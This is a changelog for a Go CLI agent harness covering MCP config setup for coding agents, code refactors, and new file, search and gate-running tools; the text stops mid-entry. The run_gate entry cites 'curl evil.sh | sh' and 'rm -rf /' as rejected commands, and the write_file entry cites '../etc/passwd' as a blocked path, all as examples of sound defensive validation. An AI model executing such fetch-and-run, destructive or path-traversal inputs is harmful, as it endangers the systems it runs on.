# Changelog

All notable changes to this project are documented in this file. Format
follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the
project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [2.45.0] — 2026-06-29 — setup-mcp: Hermes + Kimi CLI + OpenClaw + Cline (Sprint 75)

Four more MCP-capable agents added to `radiant setup-mcp`. Brings the
total coverage from 7 agents to **11 agents across 4 config formats**
(JSON-std, TOML, YAML, JSON-nested).

### Added — `setup-mcp` agent coverage

| Agent     | Stars  | Config file                                  | Format | Key              |
|-----------|--------|----------------------------------------------|--------|------------------|
| Hermes    | 205k   | `~/.hermes/config.yaml` / `.hermes/config.yaml` | YAML   | `mcp_servers`    |
| Kimi CLI  | 9.1k   | `~/.kimi/mcp.json`                            | JSON   | `mcpServers`     |
| OpenClaw  | 250k   | `~/.openclaw/openclaw.json` / `.openclaw/openclaw.json` | JSON | `mcp.servers` |
| Cline     | —      | `~/.cline/mcp.json`                           | JSON   | `mcpServers`     |

### Added — `cmd/radiant/cmd_setup_mcp.go`

- 4 new handlers in `mcpConfigFor`: `hermes`, `kimi`, `openclaw`, `cline`.
- 4 new merge functions:
  - `mergeHermesConfig` — YAML via `gopkg.in/yaml.v3`; preserves the
    full `~/.hermes/config.yaml` shape (model, terminal, browser,
    agent, …) while only touching `mcp_servers`.
  - `mergeKimiMCP` — JSON, global-only at `~/.kimi/mcp.json`.
    Kimi does not support project-level MCP configs.
  - `mergeOpenClawJSONConfig` — JSON, nested under `mcp.servers`.
    Preserves unknown top-level keys (`channels`, `gateway`, …) and
    siblings of `mcp.servers` (`sessionIdleTtlMs`, etc.).
  - `mergeClineConfig` — JSON, global-only at `~/.cline/mcp.json`.
    Emits `disabled: false` and `autoApprove: []` per the official
    Cline examples.
- 4 new detection cases in `resolveMCPAgents`:
  - `hermes` and `openclaw` are project-local (presence of `.hermes/`
    or `.openclaw/` dir).
  - `kimi` and `cline` are global-only; detected by presence of
    `~/.kimi/` or `~/.cline/` (used as a hint that the operator
    installed the agent — `--global` is always implicit for them).
- Updated `--agent` flag help, command `Long` description, and
  unknown-agent error message.

### Added — `cmd/radiant/cmd_setup_mcp_test.go`

- 18 new tests covering all 4 agents: new-file, preserve-existing,
  replace-existing, detection, `mcpConfigFor` routing (project +
  global). YAML quote-style tolerant.

### Stats

- 1 file extended: `cmd_setup_mcp.go` (+240 LOC).
- 1 file extended: `cmd_setup_mcp_test.go` (+440 LOC across 18 tests).
- 1 file added: `docs/SPRINT75-PLAN.md`.
- 0 deps added — `gopkg.in/yaml.v3` was already a project dep from
  earlier sprints.
- **1189 tests passing across 31 packages, 0 confirmed failures**
  (one known-flake `internal/fleet.TestRunAllContextCanceled` is
  timing-dependent and unrelated; documented in
  `validation-report-sprint-56-57.md`).
- `go vet ./...` clean.
- Cross-compile OK: linux/amd64, darwin/arm64, windows/amd64.

### Compatibility

- Existing agent configurations (claude/cursor/windsurf/zed/vscode/
  codex/opencode) are untouched.
- `setup-mcp --agent=…` continues to accept all 11 agent names.
- Auto-detect order is project-local first, global-only fallback
  second; this preserves existing behaviour for current users.

## [2.44.0] — 2026-06-29 — helpers.go extractions: security + scaffolds (Sprint 74)

The "debt reduction" release. Pulls 946 lines of domain-specific code
out of the 3894-line `cmd/radiant/helpers.go` into two themed files
alongside their command registrations.

### Added — `cmd/radiant/cmd_security.go` (NEW)

- `securityFinding`, `secretPattern`, `runSecurity`, `scanSecrets`,
  `scanPerms`, `renderSecurityReport` — extracted from helpers.go.
- `registerSecurityCmd(root *cobra.Command)` — replaces the inline
  security command registration that previously lived in
  `cmd_audit.go`. Same flags (`--scope`, `--output`, `--fail-on-warning`),
  same behaviour.

### Changed — `cmd/radiant/cmd_audit.go`

- Removed the inline security command registration (~25 LOC).
- Replaced with `registerSecurityCmd(root)` call.
- File now focused on its actual purpose: registering the `mcp`
  command tree.

### Added — `cmd/radiant/cmd_scaffolds.go` (NEW)

- Eight `run*Scaffold` functions extracted from helpers.go:
  `runStatsScaffold`, `runCausalEstimateScaffold`, `runModelScaffold`,
  `runPredictScaffold`, `runTrainScaffold`, `runEvaluateScaffold`,
  `runDriftScaffold`, `runProfileScaffold`.
- ~750 LOC of ML scaffold templates. Each function generates a
  markdown planning doc that the operator (or LLM via the relevant
  skill) fills in.

### Changed — `cmd/radiant/helpers.go`

- Removed `securityFinding`, `secretPattern`, `runSecurity`,
  `scanSecrets`, `scanPerms`, `renderSecurityReport` (~215 LOC).
- Removed the eight `run*Scaffold` functions (~730 LOC).
- Removed the now-unused `regexp` import (only used by security).
- File shrank from 3894 → **2948 lines** (−946 LOC, −24%).

### Stats

- 2 new files: `cmd_security.go` (272 LOC), `cmd_scaffolds.go` (752 LOC).
- 1 modified file: `cmd_audit.go` (−25 LOC inline registration).
- 1 file trimmed: `helpers.go` (−946 LOC).
- Net total: `cmd/radiant/` shrank by ~71 LOC (counting comments and
  imports in the new files).
- **997 tests passing across 30 packages, 0 confirmed failures**.
- `go vet ./...` clean.
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
  windows/amd64 (15 MB).

### Compatibility

- No breaking changes. `runSecurity`, `run*Scaffold` keep the same
  signatures and behaviour — only their physical location changed.
- `radiant security` output is byte-identical to v2.43.0.
- All scaffold commands produce byte-identical output to v2.43.0.

### Out of scope (Sprint 75+)

The helpers.go debt-reduction continues:

- PR review extraction (`runReviewPR` + helpers, ~400 LOC)
- Integrations extraction (`runIntegrationsList`, ~150 LOC)
- Incident extraction (`runIncident`, ~150 LOC)
- Product inception extraction (`renderInception`, `renderPersonasTemplate`)
- ADR extraction (`nextADRSequence`, `renderADR`)
- Evals extraction (`runEvals`, `computeFeatureCoverage`, `renderEvalsReport`)
- MCP plumbing extraction (`runMCPServe` etc., ~900 LOC) — biggest

---

## [2.43.0] — 2026-06-29 — setup-mcp: Codex + OpenCode auto-detect (Sprint 73)

Adds support for two more MCP-capable agents in `radiant setup-mcp`:
**Codex** (OpenAI CLI) and **OpenCode** (sst/opencode). Both have
public MCP support and ship config files the harness can write to.

### Added — Codex (OpenAI CLI)

- Auto-detect: presence of `.codex/` (project) or `~/.codex/`
  (global) triggers Codex config.
- TOML format: `[mcp_servers.radiant]` block with `command`,
  `args`. Project: `.codex/config.toml`. Global: `~/.codex/config.toml`.
- `mergeCodexTOML(path, entry)` — minimal TOML merge that
  preserves other sections, replaces the existing radiant block if
  present, and appends a new block otherwise.
- `tomlQuote(string)` — TOML-safe double-quoted string escaping
  (backslash, double-quote, newline, tab).
- Regex-based block capture uses Go RE2 syntax (no lookahead);
  pattern `(?ms)^\[mcp_servers\.radiant\][\s\S]*?(?:\n\[|\z)`
  matches the block up to (but not including) the next section
  header or end of file.

### Added — OpenCode (sst/opencode)

- Auto-detect: presence of `.opencode/` (project) or
  `~/.config/opencode/` (global) triggers OpenCode config.
- JSON format: `{"$schema": "...", "mcp": {"radiant": {...}}}`
  with `type: "local"` and `command: [...]` (array, not string).
  Project: `.opencode/config.json`. Global:
  `~/.config/opencode/config.json`.
- `mergeOpenCodeConfig(path, entry)` — full JSON merge that
  preserves unknown top-level keys (decoded into a flexible map,
  re-serialised after merge).
- Differs from Cursor/Windsurf/VSCode (which use `mcpServers` at
  top level): OpenCode uses `mcp` and the value is a flat map,
  not a list.

### Changed — `setup-mcp`

- Auto-detect list extended from 5 to 7 agents:
  `claude`, `cursor`, `windsurf`, `zed`, `vscode`, **`codex`**,
  **`opencode`**.
- `--agent` flag accepts the new names; comma-separated for
  multiple agents in one invocation.
- `--agent` flag help text updated.
- Long description updated with the new supported list.

### Tests

- 14 new tests in `cmd_setup_mcp_test.go`:
  - Codex: new file, preserve existing, replace existing.
  - OpenCode: new file, preserve existing, replace existing.
  - `tomlQuote`: 5 escape cases (simple, quote, backslash,
    newline, tab).
  - Detection: codex, opencode, explicit flag.
  - `mcpConfigFor`: project vs global paths for both agents,
    unknown agent error.

### Stats

- 2 new concrete agents supported (Codex, OpenCode).
- **997 tests passing across 30 packages, 0 failures** (validated
  with `go test -count=1 -v ./...`). `go vet ./...` clean.
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
  windows/amd64 (15 MB).
- 1 file modified (`cmd_setup_mcp.go`), 1 file added
  (`cmd_setup_mcp_test.go`), 1 file added
  (`docs/SPRINT73-PLAN.md`).

### Notes — what was NOT added (and why)

The user asked about 8 additional agents in addition to the 5
already supported. Two were added (Codex, OpenCode). The other six
were intentionally skipped:

| Agent | Skipped because |
|-------|-----------------|
| **hermes** | NousResearch Hermes is a model family, not an MCP host. Unclear which specific agent the user meant. |
| **MiniMax code** | Not a recognised public MCP host. Could be internal to Fortvna — needs format info. |
| **kimi code** | Moonshot's `kimi-cli` exists but public MCP support is not stable yet. Skip until upstream stabilises. |
| **open claw** | Not a recognised public MCP host. |
| **lang chain** | **LangChain is a Python framework for building agents, not an MCP host.** Adding it to `setup-mcp` would be misleading. Operators building LangChain agents wrap the harness as an MCP tool — that's the integration path. |
| **lang graph** | Same as LangChain — framework, not MCP host. Part of the LangChain ecosystem. |

### Compatibility

- No breaking changes. New agents are additive.
- Existing config files for previously-supported agents are
  untouched.
- `--agent` flag accepts comma-separated values; existing
  single-agent usage unchanged.

---

## [2.42.0] — 2026-06-29 — Light/Full by subcommand, not by flag

The "no more mode flag" release. v2.37.0 introduced Light and Full
as runtime modes with a 4-level resolution chain (flag > env >
config > auto-detect). That was overengineered and a constant source
of confusion. v2.42.0 collapses the dichotomy into the subcommand
name itself:

- `radiant mcp serve` is **always Light** — MCP sampling from the
  host agent, no API key needed.
- Every other subcommand (`loop start`, `run`, `fleet start`,
  `init`, `validate`, ...) is **always Full** — direct HTTP to
  LLM providers, API key required.

No `--mode` flag. No `RADIANT_MODE` env var. No `mode:` field in
`.radiant.yaml`. No `radiant mode show/set` subcommand. Behaviour
emerges from which subcommand the operator invokes.

### Removed — explicit mode selection

- `--mode` flag on `loop start` and `fleet start`.
- `RADIANT_MODE` env var (silently ignored if set).
- `mode:` field in `.radiant.yaml` (silently ignored if set).
- `radiant mode show` subcommand.
- `radiant mode set light|full` subcommand.
- `internal/mode.Resolve()` chain + `Source` enum (`flag`/`env`/
  `config`/`detected`) + `Resolution` struct.
- `internal/mode.Detect()` MCP-config-based auto-detection.

### Changed — subcommand semantics

- `radiant mcp serve` is now **always** Light. Removed the
  `--sampling` flag (was needed to opt in to sampling); the
  sampling path is now the default and only path.
- `radiant mcp serve` from a TTY (terminal) prints a warning that
  it expects to be invoked from an MCP host. Doesn't refuse — the
  operator can still debug.
- `radiant loop start`, `run`, `fleet start` are now **always**
  Full. No flag/env/config to set. The harness calls LLM HTTP
  endpoints directly with the operator's API key.

### Changed — `internal/mode/`

- Reduced to just the type definitions: `Light`, `Full`, `Mode`,
  `Mode.String()`, `Mode.Description()`, `Mode.IsValid()`.
- The `Resolve()` / `Detect()` / `Resolution` machinery is gone.
- Used as trace metadata only (verifier prompts and `tools/list`).
  Never read from user input.

### Changed — `radiant doctor`

- The "mode" check now reports "Full mode (CLI subcommand)"
  because the operator is running CLI subcommands by definition.
- Reports "requires API key" if no key is found (same as v2.37.0).
- No more flag/env/config resolution — just the simple check.

### Documentation

- `docs/MODES.md` — complete rewrite. Now reads as a "behaviour
  emerges from subcommand" guide instead of a resolution chain
  reference.
- README updated to reflect the simpler model.

### Stats

- 1 file deleted: `cmd/radiant/cmd_mode.go` (the `radiant mode`
  subcommand).
- 1 file rewritten: `internal/mode/mode.go` (215 LOC → 50 LOC).
- 4 files modified: `cmd_loop.go`, `cmd_fleet.go`, `cmd_audit.go`,
  `cmd_doctor.go`.
- **982 tests passing across 30 packages, 0 failures** (validated
  with `go test -count=1 -v ./...`). `go vet ./...` clean.
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
  windows/amd64 (15 MB).

### Migration

| v2.37.0–v2.41.0 | v2.42.0 |
|----------------|---------|
| `radiant mode show` | (removed — use `radiant --help`) |
| `radiant mode set light` | (removed — use `radiant mcp serve`) |
| `radiant mode set full` | (removed — all other commands are Full) |
| `--mode=light` on `loop start` | (removed — `loop` is always Full) |
| `--mode=full` on `loop start` | (removed — `loop` is always Full) |
| `RADIANT_MODE=light` env | (removed — use `radiant mcp serve`) |
| `RADIANT_MODE=full` env | (removed — always Full on non-mcp subcommands) |
| `mode: light` in `.radiant.yaml` | (removed — ignored if set) |
| `mode: full` in `.radiant.yaml` | (removed — ignored if set) |

---

## [2.41.0] — 2026-06-29 — MCP Tool-Bridge Adapter (Sprint 72)

The "any MCP server, any tool" release. Operators can now register
external MCP servers as tool sources for the radiant harness. Tools
from those servers appear in the local `tools.Registry` alongside
the built-in four (`write_file`, `read_file`, `search_code`,
`run_gate`), under `<bridge_name>__<tool_name>` namespaces.

### Added — MCP stdio client (`internal/mcpbridge/client.go`)

- New `internal/mcpbridge/` package — JSON-RPC 2.0 client over
  stdio (the MCP spec's primary transport for local servers).
- `Dial(ctx, name, command, args)` — spawns the server subprocess,
  performs the `initialize` handshake + `notifications/initialized`
  notification.
- `ListTools(ctx)` — returns the tools advertised by the server.
- `CallTool(ctx, name, args)` — invokes a tool, surfaces `isError`
  results as structured errors.
- `Close()` — graceful shutdown (SIGTERM, then SIGKILL after 2s).
- `NewClientWithStdio(...)` — for tests and power users who want
  to inject pre-wired streams.
- Timeouts per RPC: `initialize` 10s, `tools/list` 30s, `tools/call`
  60s. Cancellable via ctx.
- Pending responses tracked via `sync.Map[int64]chan rpcResponse`,
  matched by ID. Background reader goroutine drains stdout and
  dispatches to waiters.
- Protocol-level errors (`ErrTimeout`, `ErrServerCrash`,
  `ErrProtocol`) surface as typed sentinels.

### Added — Tool conversion (`internal/mcpbridge/registry.go`)

- `MCPTool.ToLocalTool(client)` — converts an MCP `tools/list`
  result into a `tools.Tool` bound to the client. Names are
  namespaced: `<bridge>__<tool>` (e.g. `github__create_issue`).
- `flattenSchema(schema)` — flattens MCP's JSON Schema
  `inputSchema` into `tools.Param` slice (type, description,
  required propagated). Complex nested schemas pass through as
  opaque `object` params.

### Added — Bridge helper (`internal/mcpbridge/bridge.go`)

- `LoadTools(ctx, name, command, args)` — convenience that dials
  + lists + converts in one call. Returns `(client, tools, err)`.
- `ParseSpec(spec)` — parses CLI flag values like
  `github:npx -y @modelcontextprotocol/server-github` into
  `(name, command, args)`.

### Added — Mock MCP server (`internal/mcpbridge/mock/main.go`)

- Minimal in-tree mock for tests. Reads JSON-RPC from stdin,
  handles `initialize` / `tools/list` / `tools/call`. Tool list
  configurable via `MOCK_TOOLS` env var; the `fail_tool` name
  triggers `isError=true` for error-path tests.

### Changed — RealRegistry signature

- `loop.RealRegistry(projectDir, mcpBridges...)` now accepts
  optional `MCPSpec` slices. Returns `(*Registry, error)`. Built-in
  tools never fail to register; an error means an MCP bridge
  failed to dial.
- `loop.RealRegistrySimple(projectDir)` is the convenience wrapper
  for callers that don't need MCP integration.

### Added — CLI flag `radiant run --mcp-bridge`

- Repeatable: `--mcp-bridge "github:npx -y ..."` can appear
  multiple times to register multiple bridges.
- Spec format: `"name:command args..."`. Parser handles quoted
  arguments.
- Failures surface as CLI errors with the bridge name and the
  underlying error.

### Documentation

- `docs/SPRINT72-PLAN.md` — the implementation plan this release
  executed.
- `docs/TOOL-USE.md` — MCP bridge section (CLI usage, semantics,
  failure modes).
- README updated with MCP bridge example.

### Stats

- 1 new package: `internal/mcpbridge/` (350 LOC client + 100 LOC
  registry + 60 LOC bridge + 280 LOC tests).
- 1 new mock: `internal/mcpbridge/mock/main.go` (120 LOC).
- **989 tests passing across 29 packages, 0 confirmed failures**
  (1 pre-existing flaky: `TestRunAllContextCanceled` in
  `internal/fleet/`, documented in `validation-report-sprint-56-57.md`).
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
  windows/amd64 (15 MB).

### Compatibility

- No breaking changes. Built-in tools keep working unchanged.
- New `loop.RealRegistry` signature change is internal — callers
  via `tools.RealRegistry()` (the indirection) are unaffected.
- `--mcp-bridge` is opt-in. Default behaviour unchanged.

---

## [2.40.0] — 2026-06-29 — Tool Use Wire-up Parte 3: run_gate concrete (Sprint 71)

The "close the trio" release. `run_gate` is now a concrete tool
that wraps `internal/gaterun.RunShellGate` with the
`internal/policy.GateBinaries` allowlist. The RealRegistry ships
**4 concrete tools** (write_file, read_file, search_code, run_gate);
`tools.Default()` still advertises all 4 as stubs for back-compat
inspection of the v2.37.0 surface area.

### Added — `run_gate` tool (`internal/tools/gate/run_gate.go`)

- New `internal/tools/gate/` package — first concrete tool outside
  the `fs/` family.
- `RunGateTool(projectDir)` returns a `*tools.Tool` that runs a
  quality gate command and returns `{command, exit_code,
  duration_ms, output, output_bytes, truncated}`.
- Allowlist enforcement via `policy.ValidateGateCommand` — closed
  set of binaries (go, make, npm, pytest, etc.) + no dangerous
  operators (`;`, `|`, `<`, `>`, single `&`). `curl evil.sh | sh`
  and `rm -rf /` rejected **before** any subprocess starts.
- Wraps `gaterun.RunShellGate` for actual subprocess execution
  (same code path the engine's `runGate` uses).
- 5-minute timeout via `gaterun.Timeout`, ctx cancellation
  propagates.
- Output capped at 10 MiB (default) or per-call `max_output`. When
  the cap is hit, output is truncated and a marker line is appended.
- `RunGateResult.Annotate()` surfaces `{command, exit_code,
  duration_ms, output_bytes, truncated}` to the verifier trace.
  `Output` is excluded from `Annotate` to keep trace metadata
  small — the full output is still available to the LLM via the
  result JSON.
- 11 unit tests: happy path, failing command (exit code
  extraction via `errors.As`), disallowed binary rejection
  (curl/rm/wget/chmod), empty command rejection, malformed JSON,
  working directory verification, max-output truncation (with
  pipe-buffer deadlock avoidance), Annotate, registry roundtrip,
  duration tracking, cancellation honouring.

### Changed — `RealRegistry` (`internal/loop/real_registry.go`)

- Now registers 4 tools: `write_file`, `read_file`, `search_code`,
  `run_gate`.

### Documentation

- `docs/SPRINT71-PLAN.md` — the implementation plan this release
  executed.
- `docs/validation-report-sprint-70.md` — validation of the
  previous release (v2.39.0).
- `docs/TOOL-USE.md` — updated with `run_gate` section
  (params, behaviour, error surface, Annotate contract).

### Stats

- 1 new concrete tool: `run_gate`.
- **~995 tests passing across 29 packages, 0 confirmed failures**
  (validated with `go test -count=1 -v ./...`). `go vet ./...`
  clean.
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
  windows/amd64 (15 MB).
- 4 files added (1 source + 1 tests + 2 docs), 2 modified
  (`real_registry.go`, `main.go`). ~830 LOC total.

### Compatibility

- No breaking changes. `run_gate` is opt-in via the existing
  `Engine.ToolRegistry` wiring.
- LLM outputs that contain only `write_file`/`read_file`/`search_code`
  keep working unchanged.
- `tools.Default()` still advertises all 4 tools (with stubs for
  the ones that are now concrete) — back-compat preserved.

---

## [2.39.0] — 2026-06-29 — Tool Use Wire-up Parte 2 (Sprint 70)

The "read before you write" release. Two new concrete tools —
`read_file` and `search_code` — close the read half of the
read-write pair and add the first search primitive. The LLM can
now inspect state before mutating it and grep the project tree
without round-tripping through the shell.

### Added — `read_file` tool (`internal/tools/fs/read_file.go`)

- `ReadFileTool(projectDir)` returns a `*tools.Tool` that reads a
  project-relative file and returns `{path, content, bytes, lines}`.
- Boundary check via `fsutil.PathIsSafe` (symlink-aware, same as
  `write_file`).
- 4 MiB size cap (`MaxReadBytes`) — symmetric with `MaxWriteBytes`
  so the LLM can read back what it just wrote.
- `os.Stat` first to give a clear "file not found" or "is a
  directory" error instead of `os.ReadFile`'s generic failure.
- `ReadResult.Annotate()` satisfies the engine's duck-typed
  `annotator` interface — verifier sees `path`/`bytes`/`lines`
  without re-parsing content.
- 12 unit tests: happy path, no-trailing-newline line counting,
  empty file, missing file, directory rejection, unsafe paths,
  symlink escape, oversize file, empty/whitespace path,
  malformed JSON, Annotate, registry roundtrip.

### Added — `search_code` tool (`internal/tools/fs/search_code.go`)

- `SearchCodeTool(projectDir)` returns a `*tools.Tool` that does
  regex search via `filepath.WalkDir` over a configurable search
  root (defaults to project root).
- Compile pattern first — bad regex surfaces as a structured
  error before any disk I/O.
- Skips hidden directories: `.git`, `.radiant-harness`,
  `node_modules`, `vendor`, `.idea`, `.vscode`.
- Skips binary files via `http.DetectContentType` on first 512
  bytes — whitelist of `text/*`, `application/json`, `application/xml`,
  `application/x-sh`, `application/javascript`.
- Results capped at `DefaultSearchMaxResults = 1000`. `Truncated=true`
  set when the cap is hit so the LLM knows to narrow the search.
- `Include` glob filter (e.g. `*.go`) for narrowing without paying
  the cost of irrelevant files.
- 1 MiB per-line buffer cap in `bufio.Scanner` — blocks pathological
  inputs (a single 100 MB line).
- `SearchResult.Annotate()` surfaces `pattern`/`root`/`match_count`/
  `truncated` to the verifier trace.
- 11 unit tests: finds matches, multiple matches per line, no
  matches, invalid regex, empty pattern, scope, include glob,
  unsafe scope, max results cap, Annotate, registry roundtrip.

### Added — Helpers (`internal/tools/fs/helper.go`)

- `absProjectDir(projectDir)` — absolute, symlink-resolved path
  of the project root. Shared by `read_file` and `search_code`.
- `joinPath(absProject, candidate)` — joins the absolute root with
  a project-relative candidate.

### Changed — `RealRegistry` (`internal/loop/real_registry.go`)

- Now registers 3 tools: `write_file`, `read_file`, `search_code`.
- `run_gate` remains a stub (Sprint 71).

### Documentation

- `docs/SPRINT70-PLAN.md` — the implementation plan this release
  executed.
- `docs/TOOL-USE.md` — updated with `read_file` and `search_code`
  sections (params, behaviour, examples).

### Stats

- 2 new concrete tools: `read_file`, `search_code`.
- **969 tests passing across 28 packages, 0 failures** (validated
  with `go test -count=1 -v ./...`). `go vet ./...` clean.
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
  windows/amd64 (15 MB).
- 5 files added (2 source + 2 tests + 1 plan doc), 1 modified
  (`real_registry.go`). ~600 LOC total.

### Compatibility

- No breaking changes. New tools are opt-in via the existing
  `Engine.ToolRegistry` wiring.
- LLM outputs that contain only `write_file` tool calls keep
  working unchanged.
- LLM can now emit `read_file` and `search_code` in addition to
  or instead of `write_file`.

---

## [2.38.0] — 2026-06-29 — Tool Use Wire-up Parte 1 (Sprint 69)

The "stop regex-parsing code blocks" release. The first concrete
structured tool — `write_file` — replaces the legacy
`os.WriteFile`-based code-block emission for any LLM output that
includes structured tool calls. The verifier prompt now surfaces
the tool-call trace so it can audit each invocation, not guess from
prose.

### Added — Concrete `write_file` tool (`internal/tools/fs/`)

- New `internal/tools/fs/` package (139 LOC) — the first concrete
  tool in the registry.
- `WriteFileTool(projectDir)` returns a `*tools.Tool` bound to the
  given project dir. Atomic write via temp + fsync + rename (same
  pattern as `cycle.go:persistLocked`).
- Boundary check via `internal/fsutil.PathIsSafe` — symlink-aware,
  catches `../etc/passwd` and nested symlink escapes.
- `MaxWriteBytes = 4 MiB` cap rejects runaway emissions.
- `WriteResult.Annotate()` implements the duck-typed `annotator`
  interface so the executor picks up byte/path/created metadata
  without taking a direct dependency on this package.
- 11 unit tests: happy path, parent dir creation, overwrite,
  unsafe path rejection (relative + symlink), empty/whitespace
  path rejection, malformed JSON, oversize content, atomicity
  invariant, schema validation, registry roundtrip.

### Added — `internal/fsutil/` package

- New neutral package hosts `PathIsSafe` so both `internal/engine`
  (legacy code-block path) and `internal/tools/fs` (write_file)
  can depend on it without an import cycle.
- 3 unit tests including the nested symlinked project root case.

### Added — Engine tool-call dispatch (`internal/engine/engine.go`)

- `applyLLMResponse` now switches on tool-call presence:
  - If `ToolRegistry != nil` and the response contains
    ```tool_call``` fences → `applyToolCalls`.
  - Otherwise → legacy `applyCodeBlocks` path (v2.37.0 behaviour).
  - Mixed responses: tool calls win, code blocks silently ignored.
- `extractToolCalls` parses ```tool_call``` fenced blocks
  (symmetric with `extractCodeBlocks`).
- `ToolCall` and `ToolCallRecord` types — exposed for the verifier
  prompt builder.
- `LastToolTrace()` returns the trace from the most recent
  `applyLLMResponse` call.
- `annotator` interface declared locally (duck-typed) so the engine
  doesn't import any concrete tool package — breaks the cycle.
- `PathIsSafe` and `pathIsSafe` retained as thin re-exports of
  `fsutil.PathIsSafe` for backwards-compat with any caller that
  depended on `engine.PathIsSafe`.

### Added — Verifier prompt trace (`internal/loop/verifier.go`)

- `BuildVerifierPrompt` accepts a new `toolTrace []ToolCallRecord`
  parameter. When non-empty, the prompt gains a
  `TOOL CALLS OBSERVED` section listing each call with name,
  written path, byte count, and error (if any).
- Two anti-cheat clauses added to the verifier prompt when the
  trace is non-empty: "no tool call wrote outside the project
  boundary" and "a tool call erroring is NOT grounds for rejection
  if the executor correctly surfaced the error and adjusted".
- Empty trace → prompt is byte-identical to v2.37.0 (back-compat).
- 4 new tests in `loop_test.go` covering trace presence, absence,
  and error surfacing.

### Added — `RealRegistry` builder (`internal/loop/real_registry.go`)

- `RealRegistry(projectDir)` returns a `*tools.Registry` with the
  concrete tools available in the current release.
- Lives in `internal/loop` (not `internal/tools`) to break an
  import cycle: `tools/fs` → `tools` (for Tool/Param types), and
  `tools` → `tools/fs` (for the builder).
- `tools.SetRealRegistryBuilder` indirection + `init()` wires it
  automatically — callers can `tools.RealRegistry(projectDir)`
  without depending on `internal/loop` directly.
- 1 test: `TestReal_IncludesConcreteWriteFile` (placeholder for
  Sprint 70 expansion).

### Added — CLI: `radiant tools` (`cmd/radiant/cmd_tools.go`)

- `radiant tools list` — table view of the default registry
  (v2.37.0 back-compat surface).
- `radiant tools list --real` — table view of the concrete registry
  (v2.38.0 wired tools).
- `radiant tools list --json` — machine-readable JSON for
  CI / dashboards.
- `radiant run --no-tools` — disable structured tool-use; force
  the legacy code-block emission path (full v2.37.0 back-compat).

### Documentation

- `docs/TOOL-USE.md` — operator guide (wire format, dispatcher,
  behaviour matrix, tool authoring instructions).
- `docs/SPRINT69-PLAN.md` — the implementation plan this release
  executed.
- README.md updated with Tool Use section (lightweight pointer
  to TOOL-USE.md).

### Stats

- 1 new package: `internal/tools/fs/` (139 LOC + 213 LOC tests).
- 1 new package: `internal/fsutil/` (74 LOC + 89 LOC tests).
- 1 new package: `internal/loop/real_registry.go` (43 LOC).
- 1 new CLI subcommand: `radiant tools list` (+`--real`, `--json`).
- 1 new flag: `--no-tools` on `radiant run`.
- **947 tests passing across 28 packages, 0 failures** (validated
  with `go test -count=1 -v ./...`). `go vet ./...` clean.
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB),
  windows/amd64 (15 MB).

### Compatibility

- No breaking changes. Default behaviour is to wire `RealRegistry`
  into `Engine.ToolRegistry` automatically. Pass `--no-tools` to
  restore v2.37.0 behaviour exactly.
- LLM outputs that contain only code blocks keep working unchanged.
- Mixed outputs (tool calls + code blocks) produce deterministic
  outcomes: tool calls win.
- `engine.PathIsSafe` retained as a thin wrapper for any caller
  that imported it directly.

---

## [2.37.0] — 2026-06-29 — Light/Full modes, Semantic Model, Lazy-Executor

The "make it closed" release. Three things the harness was missing are
now first-class: the two-mode abstraction (Light/Full), the semantic
model (credit-risk with CMN 4.966 / IFRS 9 / Basileia), and the
lazy-executor skill (ported from the ponytail ladder).

### Added — Mode abstraction (`internal/mode/`)
- New `internal/mode/` package with `Mode` enum (`light`, `full`, `auto`).
- `Resolve(flag, projectDir, configMode)` — full resolution chain:
  `--mode` flag > `RADIANT_MODE` env > `.radiant.yaml` > auto-detect.
- `Detect(projectDir)` — auto-detects via MCP config presence
  (`~/.claude/settings.json`, `.cursor/mcp.json`, etc.) or LLM API key
  in env.
- 11 unit tests covering all paths.

### Added — CLI: `radiant mode` (`cmd/radiant/cmd_mode.go`)
- `radiant mode show` — display resolved mode and where it came from.
- `radiant mode set light|full` — persist default in `.radiant.yaml`.
- `--mode=light|full|auto` flag on `radiant loop start` and `radiant fleet start`.
- `radiant doctor` now reports the active mode and validates key requirements.

### Added — Pricing catalog (`internal/pricing/`)
- New `internal/pricing/` package consolidates the three duplicated
  model-rate tables (`PresetModels`, `PricePerMTokensUSD`,
  `providerPricing`) into a single YAML source of truth.
- `data/pricing.yaml` — embedded via `//go:embed`. 25 curated presets
  across 12 vendors, with input/output rates, max tokens, and
  `verified_at` date.
- `Catalog.Get/List/Stale/EstimateCost` — thread-safe accessor.
- 9 unit tests covering known presets, case-insensitive lookup,
  cost estimation, sort order, staleness, source tracking.
- `radiant pricing list|stale|refresh` CLI commands.

### Added — Semantic model (`internal/semantic/`)
- New `internal/semantic/` package — the "what it means here" layer
  that fixes the drift problem described in the
  Ontology-vs-Semantic-Model post.
- `Model`, `Metric`, `Scope`, `Expression` types; normalize, Resolve,
  Search, RenderMarkdown, RenderMarkdownCompact methods.
- `Loader` with `//go:embed all:metrics` — same pattern as
  `internal/skill/bundle.go`. User-level overrides via
  `<root>/metrics/<domain>.yaml` when desired.
- `normalizeWithCase` splits camelCase so `ExpectedLoss` →
  `expected_loss`.
- 11 unit tests covering normalize, Resolve, Search, RenderMarkdown,
  loader caching.

### Added — Domain: credit-risk (`internal/semantic/metrics/credit-risk.yaml`)
- 7 metrics: `PD`, `LGD`, `EAD`, `RWA`, `ExpectedLoss`,
  `provision_min_ifrs9`, `capital_required`.
- Each carries description, formula (with cross-references via
  `{metric_name}` and `{scope.field}` syntax), scopes (segment × rating),
  and regulation reference (CMN 4.966 §X.X, IFRS 9 §X.X, Basileia).
- This is the layer Fortvna needs for IFRS 9 / Basileia / CMN 4.966
  work — the LLM resolves "RWA for Corporate" against curated math
  instead of inventing a number.

### Added — CLI: `radiant semantic` (`cmd/radiant/cmd_semantic.go`)
- `radiant semantic list` — show all available domains.
- `radiant semantic show <domain>` — full markdown of one domain.
- `radiant semantic resolve <domain> <metric>` — formula + regulation.
- `radiant semantic search <domain> <query>` — fuzzy search.

### Added — Loop runner integration (`internal/loop/runner.go`)
- `assembleSemanticBlock(projectDir)` — detects the project domain
